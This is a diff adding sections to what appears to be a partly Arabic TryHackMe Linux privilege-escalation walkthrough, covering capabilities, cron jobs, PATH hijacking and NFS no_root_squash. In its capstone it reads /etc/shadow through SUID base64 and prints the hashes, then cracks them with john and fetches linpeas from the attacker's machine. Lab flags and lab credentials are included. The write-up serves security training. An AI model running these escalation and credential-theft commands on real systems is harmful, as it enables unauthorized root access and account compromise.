@@ -785,6 +785,360 @@ python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
 
 
 
+
+---
+----
+
+
+```
+getcap -r / 2>/dev/null
+```
+
+![image](https://github.com/user-attachments/assets/8bcf831c-bd12-43da-be58-2f215effb02b)
+
+```
+/home/karen/vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash","sh","-c","reset; exec sh")'
+```
+
+| الجزء              | المعنى                                      |
+| ------------------ | ------------------------------------------- |
+| `vim -c`           | شغّل vim ونفّذ أمر مباشرة                   |
+| `:py3 ...`         | نفّذ كود بايثون 3 داخل vim                  |
+| `import os`        | استورد مكتبة التعامل مع النظام              |
+| `os.setuid(0)`     | غير الـ UID للمستخدم رقم 0 (يعني `root`) 🔥 |
+| `os.execl(...)`    | شغّل شيل جديد (`/bin/bash`) كأنك root       |
+| `"reset; exec sh"` | يعمل reset للشاشة ويفتح sh shell            |
+
+
+
+
+![image](https://github.com/user-attachments/assets/65526dad-54e1-4e20-95c2-8b06fd91067d)
+
+```
+THM-9349843
+```
+  
+</details>
+
+
+
+
+
+
+
+
+
+<details>
+  <summary>Privilege Escalation: Cron Jobs</summary>
+
+
+```
+cat /etc/crontab
+```
+
+![image](https://github.com/user-attachments/assets/b9c23b11-4516-4fd0-ad54-8c77db861036)
+
+
+```
+nano backup.sh
+```
+
+```
+#!/bin/bash
+cp /bin/bash /tmp/rootsh
+chmod +s /tmp/rootsh
+```
+
+```
+chmod +x backup.sh
+```
+
+```
+/tmp/rootsh -p
+```
+
+![image](https://github.com/user-attachments/assets/003a55fc-b84a-4eb2-8118-0ca7253af35f)
+
+![image](https://github.com/user-attachments/assets/514ce262-1ca7-454e-a106-c926d5843323)
+
+
+```
+THM-383000283
+```
+
+
+![image](https://github.com/user-attachments/assets/8611b0c9-fc32-46ed-9e5e-71b6c0794298)
+
+
+```
+john cron_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+![image](https://github.com/user-attachments/assets/609fc90b-4ab4-4ef6-aae5-25a115d14ba3)
+
+
+  
+</details>
+
+
+
+
+
+
+
+
+<details>
+  <summary>Privilege Escalation: PATH</summary>
+
+# 🛡️ Privilege Escalation via `$PATH` Hijacking
+
+## 📌 ما هو `$PATH`؟
+
+`$PATH` هو متغير بيئي (Environment Variable) يحتوي على قائمة من المسارات (directories)، اللي النظام بيدور فيها على الأوامر اللي بتكتبها في الطرفية (Terminal).
+
+### ✅ مثال:
+
+```bash
+$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+```
+
+لما تكتب:
+
+```bash
+$ thm
+```
+
+النظام بيدور على ملف تنفيذي اسمه `thm` في المسارات دي بالترتيب.
+
+---
+
+## 🎯 كيف نستغل `$PATH` لتصعيد الصلاحيات؟
+
+لو فيه سكربت أو برنامج بيشتغل بصلاحيات `root` (مثلاً عليه SUID)، وبيستدعي أمر داخله زي `thm` بدون المسار الكامل:
+
+```bash
+thm
+```
+
+ممكن نستغل ده عن طريق إنشاء ملف بنفس اسم الأمر `thm` ونحطه في مجلد قابل للكتابة، ونضيف المجلد ده في بداية `$PATH`. لما السكربت يشتغل، هيشغل نسختنا إحنا بدل الأمر الحقيقي!
+
+---
+
+## ⚙️ خطوات الاستغلال العملي
+
+### 🧪 السيناريو:
+
+نفترض وجود برنامج باسم `path` فيه الكود التالي:
+
+```bash
+#!/bin/bash
+thm
+```
+
+وتم إعطاءه صلاحية SUID:
+
+```bash
+$ chmod u+s path
+```
+
+### 🔍 الخطوة 1: معرفة المجلدات القابلة للكتابة
+
+نفذ الأمر التالي:
+
+```bash
+find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+```
+
+هتلاحظ أن `/tmp` عادةً بيكون قابل للكتابة.
+
+### 🔧 الخطوة 2: تعديل `$PATH`
+
+```bash
+export PATH=/tmp:$PATH
+```
+
+### 🧨 الخطوة 3: إنشاء نسخة مزيفة من `thm`
+
+```bash
+cp /bin/bash /tmp/thm
+chmod +x /tmp/thm
+```
+
+### 🚀 الخطوة 4: تشغيل برنامج `path`
+
+```bash
+./path
+```
+
+### ✅ الآن داخل الشيل:
+
+```bash
+id
+whoami
+```
+
+هيظهر:
+
+```
+uid=0(root) gid=0(root)
+```
+
+---
+
+## 💡 ملاحظات هامة:
+
+* لا تنجح هذه الطريقة إلا إذا كان السكربت لا يحدد المسار الكامل للأمر.
+* يجب أن يكون السكربت عليه SUID أو يعمل بصلاحيات `root`.
+* يمكن استخدام أوامر أخرى غير `bash` مثل `python`, `perl` إذا احتجت ذلك.
+
+---
+
+## 📜 الخلاصة
+
+| العنصر    | التفسير                                                   |
+| --------- | --------------------------------------------------------- |
+| `$PATH`   | متغير يحدد أماكن البحث عن الأوامر                         |
+| الثغرة    | سكربت root يشغل أمر بدون تحديد مساره الكامل               |
+| الاستغلال | نضع أمر بنفس الاسم في مجلد قابل للكتابة ونضيفه في `$PATH` |
+| النتيجة   | تنفيذ الأمر بصلاحيات `root` وتصبح لديك صلاحية كاملة 🔥    |
+
+---
+
+## ✅ مثال تلخيصي
+
+```bash
+export PATH=/tmp:$PATH
+cp /bin/bash /tmp/thm
+chmod +x /tmp/thm
+./path  # سكربت بيستدعي thm بدون مسار كامل
+```
+
+> النتيجة: تحصل على Shell بصلاحيات root 👑
+
+---
+
+---
+---
+
+
+
+on ``murdoch`` user
+
+```
+echo $PATH
+```
+
+``output``
+
+```
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+```
+
+```
+ls -l
+```
+
+![image](https://github.com/user-attachments/assets/c554eb60-790e-4b6e-83a1-531e67dba6b3)
+
+---
+
+![image](https://github.com/user-attachments/assets/da48da9e-8711-4709-b77b-80dc82f3fbe6)
+
+## 🎯 يعني إيه؟
+
+* السكربت بيحاول يشغّل أمر اسمه ``thm``
+
+* لكن مش كاتب المسار الكامل (زي ``/usr/bin/thm``)
+
+* وده معناه إنه بيعتمد على ``$PATH``
+
+* واللي بيتنفّذ أصلاً من برنامج عليه ``SUID`` (يعني أي أمر جوّاه بيتنفذ بصلاحيات ``root``) 💥
+
+
+
+
+## الخطوة 1: أنشئ سكربت باسم ``thm`` في مجلد قابل للكتابة (زي ``/tmp``)
+
+
+```
+echo '/bin/bash' > /tmp/thm
+chmod +x /tmp/thm
+```
+
+## ✳️ الخطوة 2: عدل ``$PATH`` علشان يحط ``/tmp`` في البداية
+
+```
+export PATH=/tmp:$PATH
+```
+
+```
+./test
+id
+```
+
+![image](https://github.com/user-attachments/assets/4a21ee9c-13ad-455e-985c-49aaf767896e)
+
+```
+THM-736628929
+```
+
+  
+</details>
+
+
+
+
+
+
+
+
+<details>
+  <summary>Privilege Escalation: NFS</summary>
+
+
+```
+cat /etc/exports
+```
+
+``no_root_squash`` so it's vuln 
+
+![image](https://github.com/user-attachments/assets/f29826d6-da3a-4ad8-83a9-bca6e972939d)
+
+on my device
+
+```
+mkdir /tmp/nfs
+mount -o rw,vers=3 10.10.189.231:/tmp /tmp/nfs
+```
+
+on machine 
+
+```
+cp /bin/bash /tmp
+```
+
+on my device
+
+```
+cp bash /tmp/nfs/rootshell 
+```
+
+![image](https://github.com/user-attachments/assets/e0457d3b-53a2-4205-b8a7-574656e5054c)
+
+on machine 
+
+```
+/tmp/rootshell -p
+```
+
+
+![image](https://github.com/user-attachments/assets/8d48e5ca-371e-44de-8101-d0c1796f2333)
+
+```
+THM-89384012
+```
+
   
 </details>
 
@@ -799,12 +1153,255 @@ python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
 
 
 
+<details>
+  <summary>Capstone Challenge</summary>
+
+
+```
+Username: leonard
+Password: Penny123
+```
+
+---
+---
+
+first try to see ``path``
+
+![image](https://github.com/user-attachments/assets/9d15e68e-307b-4da2-b81a-00c4ab68f937)
+
+so it first search on ``/home/leonard/scripts`` ok we will retrun to it 
+
+----
+
+```
+getcap -r / 2>/dev/null
+```
+
+![image](https://github.com/user-attachments/assets/129ffad7-e101-4fa8-a6a1-6fadf46a4538)
+
+
+----
+
+```
+find / -type f -perm -04000 -ls 2>/dev/null
+```
+
+```ruby
+16779966   40 -rwsr-xr-x   1 root     root        37360 Aug 20  2019 /usr/bin/base64
+17298702   60 -rwsr-xr-x   1 root     root        61320 Sep 30  2020 /usr/bin/ksu
+17261777   32 -rwsr-xr-x   1 root     root        32096 Oct 30  2018 /usr/bin/fusermount
+17512336   28 -rwsr-xr-x   1 root     root        27856 Apr  1  2020 /usr/bin/passwd
+17698538   80 -rwsr-xr-x   1 root     root        78408 Aug  9  2019 /usr/bin/gpasswd
+17698537   76 -rwsr-xr-x   1 root     root        73888 Aug  9  2019 /usr/bin/chage
+17698541   44 -rwsr-xr-x   1 root     root        41936 Aug  9  2019 /usr/bin/newgrp
+17702679  208 ---s--x---   1 root     stapusr    212080 Oct 13  2020 /usr/bin/staprun
+17743302   24 -rws--x--x   1 root     root        23968 Sep 30  2020 /usr/bin/chfn
+17743352   32 -rwsr-xr-x   1 root     root        32128 Sep 30  2020 /usr/bin/su
+17743305   24 -rws--x--x   1 root     root        23880 Sep 30  2020 /usr/bin/chsh
+17831141 2392 -rwsr-xr-x   1 root     root      2447304 Apr  1  2020 /usr/bin/Xorg
+17743338   44 -rwsr-xr-x   1 root     root        44264 Sep 30  2020 /usr/bin/mount
+17743356   32 -rwsr-xr-x   1 root     root        31984 Sep 30  2020 /usr/bin/umount
+17812176   60 -rwsr-xr-x   1 root     root        57656 Aug  9  2019 /usr/bin/crontab
+17787689   24 -rwsr-xr-x   1 root     root        23576 Apr  1  2020 /usr/bin/pkexec
+18382172   52 -rwsr-xr-x   1 root     root        53048 Oct 30  2018 /usr/bin/at
+20386935  144 ---s--x--x   1 root     root       147336 Sep 30  2020 /usr/bin/sudo
+34469385   12 -rwsr-xr-x   1 root     root        11232 Apr  1  2020 /usr/sbin/pam_timestamp_check
+34469387   36 -rwsr-xr-x   1 root     root        36272 Apr  1  2020 /usr/sbin/unix_chkpwd
+36070283   12 -rwsr-xr-x   1 root     root        11296 Oct 13  2020 /usr/sbin/usernetctl
+35710927   40 -rws--x--x   1 root     root        40328 Aug  9  2019 /usr/sbin/userhelper
+38394204  116 -rwsr-xr-x   1 root     root       117432 Sep 30  2020 /usr/sbin/mount.nfs
+958368   16 -rwsr-xr-x   1 root     root        15432 Apr  1  2020 /usr/lib/polkit-1/polkit-agent-helper-1
+37709347   12 -rwsr-xr-x   1 root     root        11128 Oct 13  2020 /usr/libexec/kde4/kpac_dhcp_helper
+51455908   60 -rwsr-x---   1 root     dbus        57936 Sep 30  2020 /usr/libexec/dbus-1/dbus-daemon-launch-helper
+17836404   16 -rwsr-xr-x   1 root     root        15448 Apr  1  2020 /usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper
+18393221   16 -rwsr-xr-x   1 root     root        15360 Oct  1  2020 /usr/libexec/qemu-bridge-helper
+37203442  156 -rwsr-x---   1 root     sssd       157872 Oct 15  2020 /usr/libexec/sssd/krb5_child
+37203771   84 -rwsr-x---   1 root     sssd        82448 Oct 15  2020 /usr/libexec/sssd/ldap_child
+37209171   52 -rwsr-x---   1 root     sssd        49592 Oct 15  2020 /usr/libexec/sssd/selinux_child
+37209165   28 -rwsr-x---   1 root     sssd        27792 Oct 15  2020 /usr/libexec/sssd/proxy_child
+18270608   16 -rwsr-sr-x   1 abrt     abrt        15344 Oct  1  2020 /usr/libexec/abrt-action-install-debuginfo-to-abrt-cache
+18535928   56 -rwsr-xr-x   1 root     root        53776 Mar 18  2020 /usr/libexec/flatpak-bwrap
+
+```
+
+
+ohhh found ``base64`` again so will try to read ``/etc/shadow``
+
+```
+LFILE=/etc/shadow
+/usr/bin/base64 "$LFILE" | base64 --decode
+```
+
+### booom 
+
+```
+root:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51::0:99999:7:::
+bin:*:18353:0:99999:7:::
+daemon:*:18353:0:99999:7:::
+adm:*:18353:0:99999:7:::
+lp:*:18353:0:99999:7:::
+sync:*:18353:0:99999:7:::
+shutdown:*:18353:0:99999:7:::
+halt:*:18353:0:99999:7:::
+mail:*:18353:0:99999:7:::
+operator:*:18353:0:99999:7:::
+games:*:18353:0:99999:7:::
+ftp:*:18353:0:99999:7:::
+nobody:*:18353:0:99999:7:::
+pegasus:!!:18785::::::
+systemd-network:!!:18785::::::
+dbus:!!:18785::::::
+polkitd:!!:18785::::::
+colord:!!:18785::::::
+unbound:!!:18785::::::
+libstoragemgmt:!!:18785::::::
+saslauth:!!:18785::::::
+rpc:!!:18785:0:99999:7:::
+gluster:!!:18785::::::
+abrt:!!:18785::::::
+postfix:!!:18785::::::
+setroubleshoot:!!:18785::::::
+rtkit:!!:18785::::::
+pulse:!!:18785::::::
+radvd:!!:18785::::::
+chrony:!!:18785::::::
+saned:!!:18785::::::
+apache:!!:18785::::::
+qemu:!!:18785::::::
+ntp:!!:18785::::::
+tss:!!:18785::::::
+sssd:!!:18785::::::
+usbmuxd:!!:18785::::::
+geoclue:!!:18785::::::
+gdm:!!:18785::::::
+rpcuser:!!:18785::::::
+nfsnobody:!!:18785::::::
+gnome-initial-setup:!!:18785::::::
+pcp:!!:18785::::::
+sshd:!!:18785::::::
+avahi:!!:18785::::::
+oprofile:!!:18785::::::
+tcpdump:!!:18785::::::
+leonard:$6$JELumeiiJFPMFj3X$OXKY.N8LDHHTtF5Q/pTCsWbZtO6SfAzEQ6UkeFJy.Kx5C9rXFuPr.8n3v7TbZEttkGKCVj50KavJNAm7ZjRi4/::0:99999:7:::
+mailnull:!!:18785::::::
+smmsp:!!:18785::::::
+nscd:!!:18785::::::
+missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::
+```
+
+
+now we have 2 new hashes for users ``missy`` & ``root``
+
+```
+root:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51
+missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/
+```
+
+```
+john --session=mycrack missy_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+
+missy password
+
+```
+Password1
+```
+
+![image](https://github.com/user-attachments/assets/5e81d7bd-32e5-409a-8064-bbb89c34bd84)
+
+```
+find / -type f -iname '*flag1.txt' 2>/dev/null
+```
+
+```
+/home/missy/Documents/flag1.txt
+```
+
+but i can't crack ``root`` hash
+
+now i'm using ``missy`` user
+
+```
+sudo -l
+```
+
+![image](https://github.com/user-attachments/assets/ecdb1786-b7aa-4fd1-8dcc-e74f91ea8ef7)
+
+![image](https://github.com/user-attachments/assets/8ad7f29e-ed2c-4b54-851e-c50924aff702)
+
+
+```
+sudo find . -exec /bin/sh \; -quit
+```
+
+
+![image](https://github.com/user-attachments/assets/c57a5b2a-cf19-4b71-9d97-4147be5b1f9f)
+
+```
+THM-168824782390238
+```
+
+
+<details>
+  <summary>Linpeas⭕</summary>
 
 
 
+```
+python3 -m http.server 8888
+```
+
+```
+wget http://<tun0_IP>:8888/linpeas.sh
+```
+
+![image](https://github.com/user-attachments/assets/87388684-fe83-4d25-9533-63d565bf2846)
+
+* ![image](https://github.com/user-attachments/assets/dd5a988c-2e00-45a9-ab13-724d737131aa)
+
+* ![image](https://github.com/user-attachments/assets/6a024c09-af8e-4c99-9af7-f5253d9657a8)
+
+* there is alot of ``CVE'S`` you should take look on it
+
+* ![image](https://github.com/user-attachments/assets/8a3dc6e2-d905-4ac9-92cd-625925606858)
+
+* ![image](https://github.com/user-attachments/assets/d4be487b-c6f1-4ff2-bf00-3e68b72526eb)
+
+* ![image](https://github.com/user-attachments/assets/9789c558-6bc6-4ef5-9688-29dc6a149810)
+
+  ![image](https://github.com/user-attachments/assets/ea244bef-6d61-4448-b401-4c288ed3ccbd)
+
+  ![image](https://github.com/user-attachments/assets/fbd04ea8-8113-4aeb-83c3-98ec16c54dee)
+
+  ![image](https://github.com/user-attachments/assets/38859a63-b86a-4382-84a3-4f61462fbfed)
 
 
+* ![image](https://github.com/user-attachments/assets/69c29eec-c567-4bba-bcea-abe362daebdf)
 
+* ![image](https://github.com/user-attachments/assets/d7cbb3c0-044a-47ce-8991-fc314be89fc5)
+
+* ![image](https://github.com/user-attachments/assets/ce0f7a0c-ae86-4b68-b2a5-900162278670)
+
+* ![image](https://github.com/user-attachments/assets/1a586fe5-0a89-40af-9d17-7ec09de2ee86)
+
+* ![image](https://github.com/user-attachments/assets/6ba0a091-ceb2-44c0-9fd9-41f088799b61)
+
+* ![image](https://github.com/user-attachments/assets/09a00a7e-9dfe-445d-9f16-1e482bb7937a)
+
+* ![image](https://github.com/user-attachments/assets/f5d36712-1cd1-4b03-ba7f-cf591aaaf256)
+
+* ![image](https://github.com/user-attachments/assets/6ad2bbfb-a99d-4b60-a060-701b64f8f7ef)
+
+* ![image](https://github.com/user-attachments/assets/b48eee31-10d4-461c-92c3-04d97ee770d2)
+
+* 
+  
+</details>
+
+
+  
+</details>
 
 
 
